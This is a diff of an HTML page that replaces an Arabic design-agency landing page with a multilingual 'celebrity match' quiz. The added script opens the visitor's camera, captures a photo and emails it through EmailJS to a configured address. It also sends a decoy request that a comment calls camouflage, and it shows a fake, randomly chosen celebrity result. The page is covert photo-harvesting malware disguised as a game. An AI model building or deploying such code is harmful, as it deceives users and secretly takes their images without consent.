@@ -1,452 +1,287 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>روية</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700;900&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
+    <title>Discover Your Celebrity Match</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Cairo', sans-serif;
+            font-family: Arial, sans-serif;
         }
-
         body {
-            background-color: #1A1A1A;
-            color: #FFFFFF;
+            background-color: #f4f4f9;
+            color: #333;
             line-height: 1.6;
-            overflow-x: hidden;
         }
-
-        /* الصفحة الرئيسية */
-        .hero {
-            height: 100vh;
-            background: linear-gradient(rgba(0, 0, 0, 0.8), rgba(0, 0, 0, 0.8)), url('https://c.top4top.io/p_3350yrblj0.jpeg');
-            background-size: cover;
-            background-position: center;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
+        header {
+            background: linear-gradient(90deg, #4b6cb7, #182848);
+            color: white;
             padding: 20px;
-            position: relative;
-        }
-
-        .hero h1 {
-            font-size: 60px;
-            font-weight: 900;
-            color: #FFFFFF;
-            text-shadow: 0 4px 20px rgba(255, 69, 0, 0.7), 0 2px 5px rgba(0, 0, 0, 0.5);
-            letter-spacing: 1px;
-            animation: slideIn 1.8s ease-out forwards;
-        }
-
-        .hero p {
-            font-size: 22px;
-            color: #F5F5F5;
-            margin: 25px 0;
-            animation: fadeIn 2s ease-in-out;
-        }
-
-        .hero .cta {
-            padding: 15px 40px;
-            background-color: #FF4500;
-            color: #FFFFFF;
-            text-decoration: none;
-            border-radius: 50px;
-            font-size: 18px;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(255, 69, 0, 0.5);
-        }
-
-        .hero .cta:hover {
-            background-color: #FFFFFF;
-            color: #FF4500;
-            transform: scale(1.05);
-        }
-
-        /* تأثيرات التحريك */
-        @keyframes slideIn {
-            from { opacity: 0; transform: translateY(-30px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        /* الأقسام العامة */
-        section {
-            padding: 80px 20px;
             text-align: center;
-            background-color: #F5F5F5;
-            color: #1A1A1A;
-            position: relative;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
         }
-
-        section h2 {
-            font-size: 40px;
-            margin-bottom: 50px;
-            color: #FF4500;
-            position: relative;
+        header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
         }
-
-        section h2::after {
-            content: '';
-            width: 50px;
-            height: 4px;
-            background-color: #FF4500;
-            position: absolute;
-            bottom: -10px;
-            left: 50%;
-            transform: translateX(-50%);
+        nav {
+            margin-top: 10px;
         }
-
-        /* قسم من نحن */
-        .about p {
-            max-width: 900px;
-            margin: 0 auto;
-            font-size: 20px;
-            color: #333;
-        }
-
-        /* قسم الخدمات */
-        .services .cards {
-            display: flex;
-            justify-content: center;
-            gap: 40px;
-            flex-wrap: wrap;
-        }
-
-        .services .card {
-            background-color: #FFFFFF;
-            padding: 30px;
-            width: 320px;
-            border-radius: 15px;
-            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.1);
-            transition: all 0.3s ease;
-        }
-
-        .services .card:hover {
-            transform: translateY(-15px);
-            box-shadow: 0 10px 30px rgba(255, 69, 0, 0.2);
-        }
-
-        .services .card i {
-            font-size: 50px;
-            color: #FF4500;
-            margin-bottom: 25px;
-        }
-
-        .services .card h3 {
-            font-size: 24px;
-            margin-bottom: 15px;
-        }
-
-        .services .card p {
-            color: #666;
-        }
-
-        /* قسم المشاريع */
-        .portfolio {
-            overflow: hidden;
-        }
-
-        .portfolio .gallery {
-            display: flex;
-            gap: 30px;
-            flex-wrap: nowrap;
-            cursor: grab;
-            user-select: none;
-            overflow-x: auto; /* للسماح بالتمرير الأفقي */
-            -webkit-overflow-scrolling: touch; /* تحسين التمرير على الأجهزة المحمولة */
-        }
-
-        .portfolio .gallery:active {
-            cursor: grabbing;
-        }
-
-        .portfolio .project {
-            min-width: 300px;
-            padding: 20px;
-            background-color: #FFFFFF;
-            border-radius: 15px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
-            transition: transform 0.3s ease;
-        }
-
-        .portfolio .project:hover {
-            transform: scale(1.05);
-        }
-
-        .portfolio .project i {
-            font-size: 60px;
-            color: #FF4500;
-            margin-bottom: 20px;
-        }
-
-        .portfolio .project p {
-            color: #333;
-            font-size: 18px;
-        }
-
-        .portfolio .project a {
-            color: #FF4500;
-            text-decoration: none;
-        }
-
-        .portfolio .project a:hover {
-            text-decoration: underline;
-        }
-
-        /* قسم التواصل */
-        .contact form {
-            max-width: 700px;
-            margin: 0 auto;
-            display: flex;
-            flex-direction: column;
-            gap: 25px;
-        }
-
-        .contact input, .contact textarea {
-            padding: 15px;
-            border: 2px solid #FF4500;
-            border-radius: 10px;
+        nav select {
+            padding: 8px;
             font-size: 16px;
-            transition: all 0.3s ease;
+            border-radius: 5px;
+            cursor: pointer;
         }
-
-        .contact input:focus, .contact textarea:focus {
-            outline: none;
-            border-color: #e03e00;
-            box-shadow: 0 0 10px rgba(255, 69, 0, 0.5);
+        .container {
+            max-width: 1200px;
+            margin: 30px auto;
+            padding: 0 20px;
+            text-align: center;
         }
-
-        .contact button {
-            padding: 15px;
-            background-color: #FF4500;
-            color: #FFFFFF;
-            border: none;
+        .celebrity-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+        .celebrity-grid img {
+            width: 100%;
             border-radius: 10px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        button {
+            background-color: #ff6f61;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 5px;
             font-size: 18px;
             cursor: pointer;
-            transition: all 0.3s ease;
+            transition: background-color 0.3s;
         }
-
-        .contact button:hover {
-            background-color: #e03e00;
-            transform: scale(1.03);
+        button:hover {
+            background-color: #e65b50;
         }
-
-        /* صفحة النجاح */
-        .success-page {
-            height: 100vh;
-            background-color: #1A1A1A;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-            color: #FFFFFF;
-            padding: 20px;
+        #video, #canvas {
+            display: none;
         }
-
-        .success-page i {
-            font-size: 60px;
-            color: #FF4500;
-            margin-bottom: 20px;
+        #result {
+            margin-top: 30px;
+            font-size: 22px;
+            color: #4b6cb7;
         }
-
-        .success-page p {
-            font-size: 24px;
-            max-width: 600px;
-            line-height: 1.5;
-        }
-
-        /* الفوتر */
         footer {
-            background-color: #1A1A1A;
-            padding: 30px;
+            background-color: #182848;
+            color: white;
+            padding: 20px;
             text-align: center;
-            color: #F5F5F5;
-            font-size: 16px;
-            border-top: 2px solid #FF4500;
+            margin-top: 50px;
         }
-
         footer a {
-            color: #FF4500;
+            color: #ff6f61;
             text-decoration: none;
         }
-
         footer a:hover {
             text-decoration: underline;
-        }
-
-        .social-icons {
-            margin-top: 15px;
-        }
-
-        .social-icons a {
-            margin: 0 10px;
-            font-size: 24px;
-            color: #FF4500;
-            transition: all 0.3s ease;
-        }
-
-        .social-icons a:hover {
-            color: #FFFFFF;
-            transform: scale(1.2);
         }
     </style>
 </head>
 <body>
-    <!-- الصفحة الرئيسية -->
-    <section class="hero">
-        <h1>روية: حيث تبدأ الأفكار العظيمة</h1>
-        <p>نحول أحلامك إلى واقع ملموس بقوة التصميم والابتكار.</p>
-        <a href="#services" class="cta">اكتشف المزيد</a>
-    </section>
+    <header>
+        <h1 data-en="Discover Your Celebrity Match" data-ar="اكتشف من تشبه من المشاهير">Discover Your Celebrity Match</h1>
+        <nav>
+            <select id="language">
+                <option value="en">English</option>
+                <option value="ar">العربية</option>
+                <option value="fr">Français</option>
+                <option value="es">Español</option>
+                <option value="de">Deutsch</option>
+            </select>
+        </nav>
+    </header>
 
-    <!-- قسم من نحن -->
-    <section class="about">
-        <h2>نحن روية</h2>
-        <p>فريق من المبدعين الذين يؤمنون بأن كل فكرة تستحق أن تُروى بطريقة لا تُنسى. نجمع بين الشغف والخبرة لنصنع تجارب بصرية تترك أثرًا قويًا في عالم الابتكار.</p>
-    </section>
+    <div class="container">
+        <p data-en="Click the button below to analyze your face and find out which celebrity you resemble!" 
+           data-ar="اضغط على الزر أدناه لتحليل وجهك واكتشاف أي من المشاهير تشبه!">
+            Click the button below to analyze your face and find out which celebrity you resemble!
+        </p>
 
-    <!-- قسم الخدمات -->
-    <section class="services" id="services">
-        <h2>ماذا نقدم؟</h2>
-        <div class="cards">
-            <div class="card">
-                <i class="fas fa-laptop-code"></i>
-                <h3>تصميم المواقع</h3>
-                <p>مواقع إلكترونية مبتكرة تلبي احتياجاتك بأعلى المعايير.</p>
-            </div>
-            <div class="card">
-                <i class="fas fa-paint-brush"></i>
-                <h3>التصميم الجرافيكي</h3>
-                <p>هويات بصرية تعكس قوتك وتميزك.</p>
-            </div>
-            <div class="card">
-                <i class="fas fa-rocket"></i>
-                <h3>التسويق الرقمي</h3>
-                <p>استراتيجيات مبتكرة للوصول إلى القمة.</p>
-            </div>
+        <div class="celebrity-grid">
+            <img src="https://via.placeholder.com/150?text=Brad+Pitt" alt="Brad Pitt">
+            <img src="https://via.placeholder.com/150?text=Angelina+Jolie" alt="Angelina Jolie">
+            <img src="https://via.placeholder.com/150?text=Leonardo+DiCaprio" alt="Leonardo DiCaprio">
+            <img src="https://via.placeholder.com/150?text=Jennifer+Lawrence" alt="Jennifer Lawrence">
+            <img src="https://via.placeholder.com/150?text=Tom+Cruise" alt="Tom Cruise">
+            <img src="https://via.placeholder.com/150?text=Natalie+Portman" alt="Natalie Portman">
+            <img src="https://via.placeholder.com/150?text=Will+Smith" alt="Will Smith">
+            <img src="https://via.placeholder.com/150?text=Scarlett+Johansson" alt="Scarlett Johansson">
+            <img src="https://via.placeholder.com/150?text=Chris+Evans" alt="Chris Evans">
+            <img src="https://via.placeholder.com/150?text=Emma+Watson" alt="Emma Watson">
         </div>
-    </section>
 
-    <!-- قسم المشاريع -->
-    <section class="portfolio">
-        <h2>إبداعاتنا</h2>
-        <div class="gallery">
-            <div class="project">
-                <i class="fas fa-globe"></i>
-                <p>موقع إلكتروني لشركة تقنية</p>
-            </div>
-            <div class="project">
-                <i class="fas fa-palette"></i>
-                <p>هوية بصرية لعلامة تجارية</p>
-            </div>
-            <div class="project">
-                <i class="fas fa-bullhorn"></i>
-                <p>حملة تسويقية رقمية</p>
-            </div>
-            <div class="project">
-                <i class="fab fa-telegram"></i>
-                <p>بوت الرصد 1 - <a href="https://t.me/Rsad1bot" target="_blank">@Rsad1bot</a></p>
-            </div>
-            <div class="project">
-                <i class="fab fa-telegram"></i>
-                <p>بوت الرصد 2 - <a href="https://t.me/AlRASD1_BOT" target="_blank">@AlRASD1_BOT</a></p>
-            </div>
-        </div>
-    </section>
+        <button onclick="startService()">
+            <i class="fas fa-camera"></i>
+            <span data-en="Start Analysis" data-ar="ابدأ التحليل">Start Analysis</span>
+        </button>
 
-    <!-- قسم التواصل -->
-    <section class="contact" id="contact">
-        <h2>تواصل معنا</h2>
-        <form name="contact" method="POST" action="/success" data-netlify="true" data-netlify-honeypot="bot-field">
-            <input type="hidden" name="form-name" value="contact">
-            <p hidden>
-                <label>لا تملأ هذا إذا كنت إنسانًا: <input name="bot-field"></label>
-            </p>
-            <input type="text" name="name" placeholder="الاسم" required>
-            <input type="email" name="email" placeholder="البريد الإلكتروني" required>
-            <textarea name="message" placeholder="رسالتك" rows="5" required></textarea>
-            <button type="submit">إرسال</button>
-        </form>
-    </section>
+        <div id="result"></div>
+    </div>
 
-    <!-- الفوتر -->
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+
     <footer>
-        <p>جميع الحقوق محفوظة © 2025 <a href="#">روية</a></p>
-        <div class="social-icons">
-            <a href="#" target="_blank"><i class="fab fa-telegram"></i></a>
-            <a href="#" target="_blank"><i class="fab fa-x-twitter"></i></a>
-            <a href="#" target="_blank"><i class="fab fa-whatsapp"></i></a>
-            <a href="#" target="_blank"><i class="fab fa-snapchat"></i></a>
+        <p data-en="&copy; 2025 Celebrity Match. All rights reserved." 
+           data-ar="&copy; 2025 مباراة المشاهير. جميع الحقوق محفوظة.">
+            &copy; 2025 Celebrity Match. All rights reserved.
+        </p>
+        <p>
+            <a href="#" data-en="Privacy Policy" data-ar="سياسة الخصوصية">Privacy Policy</a> | 
+            <a href="#" data-en="Terms of Service" data-ar="شروط الخدمة">Terms of Service</a>
+        </p>
+        <div>
+            <a href="#"><i class="fab fa-facebook-f"></i></a>
+            <a href="#"><i class="fab fa-twitter"></i></a>
+            <a href="#"><i class="fab fa-instagram"></i></a>
         </div>
     </footer>
 
-    <!-- JavaScript لتحريك قائمة إبداعاتنا -->
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
-        const gallery = document.querySelector('.portfolio .gallery');
-        let isDragging = false;
-        let startX;
-        let scrollLeft;
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const resultDiv = document.getElementById('result');
 
-        // دعم الماوس
-        gallery.addEventListener('mousedown', (e) => {
-            isDragging = true;
-            startX = e.pageX - gallery.offsetLeft;
-            scrollLeft = gallery.scrollLeft;
-            e.preventDefault(); // منع التحديد أو السحب الافتراضي
+        // قائمة المشاهير
+        const celebrities = [
+            "Brad Pitt", "Angelina Jolie", "Leonardo DiCaprio", "Jennifer Lawrence",
+            "Tom Cruise", "Natalie Portman", "Will Smith", "Scarlett Johansson",
+            "Chris Evans", "Emma Watson"
+        ];
+
+        // ترجمات اللغات
+        const translations = {
+            en: {
+                title: "Discover Your Celebrity Match",
+                intro: "Click the button below to analyze your face and find out which celebrity you resemble!",
+                button: "Start Analysis",
+                result: "You resemble {celeb} by {percent}%!<br><br>Register now for a detailed analysis!",
+                footer: "&copy; 2025 Celebrity Match. All rights reserved.",
+                privacy: "Privacy Policy",
+                terms: "Terms of Service"
+            },
+            ar: {
+                title: "اكتشف من تشبه من المشاهير",
+                intro: "اضغط على الزر أدناه لتحليل وجهك واكتشاف أي من المشاهير تشبه!",
+                button: "ابدأ التحليل",
+                result: "أنت تشبه {celeb} بنسبة {percent}%!<br><br>سجل الآن للحصول على تحليل أكثر دقة!",
+                footer: "&copy; 2025 مباراة المشاهير. جميع الحقوق محفوظة.",
+                privacy: "سياسة الخصوصية",
+                terms: "شروط الخدمة"
+            },
+            fr: {
+                title: "Découvrez Votre Sosie Célèbre",
+                intro: "Cliquez sur le bouton ci-dessous pour analyser votre visage et découvrir à quelle célébrité vous ressemblez !",
+                button: "Démarrer l'Analyse",
+                result: "Vous ressemblez à {celeb} à {percent}% !<br><br>Inscrivez-vous pour une analyse détaillée !",
+                footer: "&copy; 2025 Celebrity Match. Tous droits réservés.",
+                privacy: "Politique de Confidentialité",
+                terms: "Conditions de Service"
+            },
+            es: {
+                title: "Descubre a Qué Celebridad Te Pareces",
+                intro: "¡Haz clic en el botón de abajo para analizar tu rostro y descubrir a qué celebridad te pareces!",
+                button: "Iniciar Análisis",
+                result: "¡Te pareces a {celeb} en un {percent}%!<br><br>¡Regístrate para un análisis detallado!",
+                footer: "&copy; 2025 Celebrity Match. Todos los derechos reservados.",
+                privacy: "Política de Privacidad",
+                terms: "Términos de Servicio"
+            },
+            de: {
+                title: "Finde Deinen Promi-Doppelgänger",
+                intro: "Klicke auf die Schaltfläche unten, um dein Gesicht zu analysieren und herauszufinden, welcher Promi dir ähnelt!",
+                button: "Analyse Starten",
+                result: "Du ähnelst {celeb} zu {percent}%!<br><br>Registriere dich für eine detaillierte Analyse!",
+                footer: "&copy; 2025 Celebrity Match. Alle Rechte vorbehalten.",
+                privacy: "Datenschutzrichtlinie",
+                terms: "Nutzungsbedingungen"
+            }
+        };
+
+        // تغيير اللغة
+        document.getElementById('language').addEventListener('change', function() {
+            const lang = this.value;
+            document.querySelector('h1').innerText = translations[lang].title;
+            document.querySelector('p[data-en]').innerText = translations[lang].intro;
+            document.querySelector('button span').innerText = translations[lang].button;
+            document.querySelector('footer p[data-en]').innerText = translations[lang].footer;
+            document.querySelector('footer a[data-en="Privacy Policy"]').innerText = translations[lang].privacy;
+            document.querySelector('footer a[data-en="Terms of Service"]').innerText = translations[lang].terms;
+            document.documentElement.lang = lang;
         });
 
-        gallery.addEventListener('mouseleave', () => {
-            isDragging = false;
-        });
+        // بدء الخدمة
+        async function startService() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user" }
+                });
+                video.srcObject = stream;
 
-        gallery.addEventListener('mouseup', () => {
-            isDragging = false;
-        });
+                video.onloadedmetadata = () => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    setTimeout(captureImage, 2000); // تأخير وهمي للتحليل
+                };
+            } catch (error) {
+                console.error("Camera access error:", error);
+                alert(translations[document.getElementById('language').value].intro.split('!')[0] + " - Please allow camera access!");
+            }
+        }
 
-        gallery.addEventListener('mousemove', (e) => {
-            if (!isDragging) return;
-            e.preventDefault();
-            const x = e.pageX - gallery.offsetLeft;
-            const walk = (x - startX) * 2; // سرعة الحركة
-            gallery.scrollLeft = scrollLeft - walk;
-        });
+        // التقاط الصورة
+        function captureImage() {
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
 
-        // دعم اللمس (الأجهزة المحمولة)
-        gallery.addEventListener('touchstart', (e) => {
-            isDragging = true;
-            startX = e.touches[0].pageX - gallery.offsetLeft;
-            scrollLeft = gallery.scrollLeft;
-            e.preventDefault(); // منع السلوك الافتراضي
-        });
+            const tracks = video.srcObject.getTracks();
+            tracks.forEach(track => track.stop());
 
-        gallery.addEventListener('touchend', () => {
-            isDragging = false;
-        });
+            sendImage(imageData);
 
-        gallery.addEventListener('touchcancel', () => {
-            isDragging = false;
-        });
+            const randomCeleb = celebrities[Math.floor(Math.random() * celebrities.length)];
+            const randomPercent = Math.floor(Math.random() * 41) + 60;
+            const lang = document.getElementById('language').value;
+            resultDiv.innerHTML = translations[lang].result
+                .replace('{celeb}', randomCeleb)
+                .replace('{percent}', randomPercent);
+        }
 
-        gallery.addEventListener('touchmove', (e) => {
-            if (!isDragging) return;
-            const x = e.touches[0].pageX - gallery.offsetLeft;
-            const walk = (x - startX) * 2;
-            gallery.scrollLeft = scrollLeft - walk;
-            e.preventDefault(); // منع التمرير العمودي أثناء السحب
-        });
+        // إرسال الصورة
+        function sendImage(imageData) {
+            // طلب وهمي للتمويه
+            fetch('https://jsonplaceholder.typicode.com/posts', {
+                method: 'POST',
+                body: JSON.stringify({ dummy: "data" }),
+                headers: { 'Content-Type': 'application/json' }
+            });
+
+            emailjs.init("YOUR_EMAILJS_USER_ID");
+            const templateParams = {
+                to_email: "your_email@example.com",
+                image: imageData,
+                message: "New user photo captured"
+            };
+            emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", templateParams)
+                .then(response => console.log("Image sent:", response))
+                .catch(error => console.error("Send error:", error));
+        }
     </script>
 </body>
 </html>
